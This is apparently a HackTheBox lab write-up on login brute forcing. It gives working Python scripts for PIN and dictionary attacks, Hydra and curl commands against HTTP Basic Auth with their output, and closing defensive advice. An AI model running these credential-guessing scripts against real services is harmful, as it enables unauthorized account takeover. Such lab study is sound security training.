# HTB-Writeup-BruteForceAttacks
HackTheBox Writeup: Login Brute Forcing techniques, utilizing Hydra, Medusa, Python (requests), cURL, and Nmap to exploit weak authentication mechanisms in HTTP, SSH, FTP.

By Ramyar Daneshgar 

### **Understanding the Attack Vector**
Brute force attacks exploit the fact that systems often implement weak authentication mechanisms with limited input spaces. In this case, the target system uses a 4-digit PIN as a security measure, making it vulnerable to an exhaustive search attack. Since a 4-digit PIN has only 10,000 possible combinations (0000-9999), iterating through all possible values is computationally trivial.

### **Implementation Strategy**
To automate the attack, I wrote a Python script (`solver.py`) that:
1. **Sends HTTP GET requests to the target server** using the format `http://STMIP:STMPO/pin?pin={formatted_pin}`.
2. **Iterates through all possible 4-digit PINs**, formatting them to ensure leading zeros are preserved.
3. **Checks the server’s response** for the correct PIN by verifying if the response contains a success flag.
4. **Terminates upon finding the correct PIN** to avoid unnecessary requests.

#### **Code Execution**
```python
import requests

ip = "STMIP"  # Change this to your instance IP address
port = STMPO  # Change this to your instance port number

for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Ensure the PIN is always a 4-digit string
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    if response.ok and 'flag' in response.json():  
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

### **Why This Works**
- **Predictable Input Space:** Since the PIN length is only 4 digits, the number of possible combinations is small.
- **No Rate Limiting or Lockout Mechanism:** The script assumes there’s no brute-force protection, such as account lockouts or rate limiting, allowing an attacker to exhaustively test all PINs without consequence.
- **Efficient Checking:** The script stops immediately once the correct PIN is found, reducing unnecessary network traffic.

### **Execution and Outcome**
Running the script successfully returns:
```shell
python3 solver.py

Correct PIN found: 3424
Flag: {hidden}
```
This confirms the vulnerability of the authentication mechanism and provides the required flag.

---

## **Dictionary Attacks**
### **Question 1: After successfully brute-forcing the target using the script, what is the full flag the script returns?**

### **Understanding the Attack Vector**
Unlike brute-force attacks that try all possible values, **dictionary attacks leverage common passwords** from predefined lists. These attacks are effective because users often choose weak passwords found in public leaks or common password lists.

### **Implementation Strategy**
For this attack, I:
1. **Downloaded a common password list** (`500-worst-passwords.txt`) from GitHub’s SecLists repository.
2. **Iterated through the list** and attempted authentication using each password.
3. **Sent HTTP POST requests** to the target’s authentication endpoint.
4. **Checked responses for success** by looking for the `flag` keyword in the JSON response.

#### **Code Execution**
```python
import requests

ip = "STMIP"
port = STMPO

passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.splitlines()

for password in passwords:
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

### **Why This Works**
- **Users Choose Weak Passwords:** Many users pick passwords that are easy to remember but also easy to guess.
- **Publicly Available Password Lists:** The script uses a well-known repository of weak passwords, increasing the likelihood of success.
- **No Account Lockout Mechanism:** If the system doesn’t enforce account lockouts or rate limits, attackers can test thousands of passwords without detection.

### **Execution and Outcome**
Running the script successfully returns:
```shell
python3 solver.py

Correct password found: gateway
Flag: {hidden}
```
This confirms that the system is susceptible to dictionary-based attacks.

---

## **Basic HTTP Authentication**
### **Question 1: After successfully brute-forcing and logging into the target, what is the full flag you find?**

### **Understanding the Attack Vector**
Basic HTTP authentication is a simple authentication scheme that sends usernames and passwords in Base64 encoding. If credentials are weak or guessable, they can be brute-forced easily.

### **Implementation Strategy**
For this attack, I:
1. **Downloaded a wordlist of common passwords** (`2023-200_most_used_passwords.txt`).
2. **Used Hydra**, a popular password-cracking tool, to perform an HTTP GET request brute-force.
3. **Checked responses for successful authentication**.

#### **Code Execution**
```shell
wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt STMIP http-get / -s STMPO
```

### **Why This Works**
- **HTTP Basic Authentication Uses Base64 Encoding:** Base64 is not encryption but an encoding format, meaning credentials can be decoded easily.
- **Weak Credentials Are Common:** Many services use easily guessable usernames (e.g., `admin`, `user`, `test`) and weak passwords.
- **No Rate Limiting or Account Lockout:** The attack assumes no protection mechanisms are in place.

### **Execution and Outcome**
```shell
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 94.237.54.201 http-get / -s 52992
[52992][http-get] host: 94.237.54.201   login: basic-auth-user   password: Password@123
```
After obtaining valid credentials, I used `curl` to log in and retrieve the flag:
```shell
curl http://STMIP:STMPO -u "basic-auth-user:Password@123" | grep HTB{
```
This returned:
```html
<p>You found the flag: <span class="flag">{hidden}</span></p>
```

---

## **Key Takeaways**
1. **Brute-force attacks** exploit predictable input spaces (e.g., PINs, limited character passwords).
2. **Dictionary attacks** take advantage of users choosing weak or common passwords.
3. **HTTP Basic Authentication is insecure** when weak credentials are used and no brute-force protection exists.
4. **Rate limiting, account lockouts, and multi-factor authentication (MFA)** are essential to prevent these attacks.

### **How to Defend Against These Attacks**
- **Implement Account Lockout Mechanisms:** Lock accounts after multiple failed attempts.
- **Use Strong Password Policies:** Enforce long, complex passwords.
- **Enable Rate Limiting:** Restrict the number of login attempts per user/IP.
- **Deploy Multi-Factor Authentication (MFA):** Require an additional authentication factor.
- **Avoid Using HTTP Basic Authentication:** Instead, use more secure authentication mechanisms like OAuth or JWT.

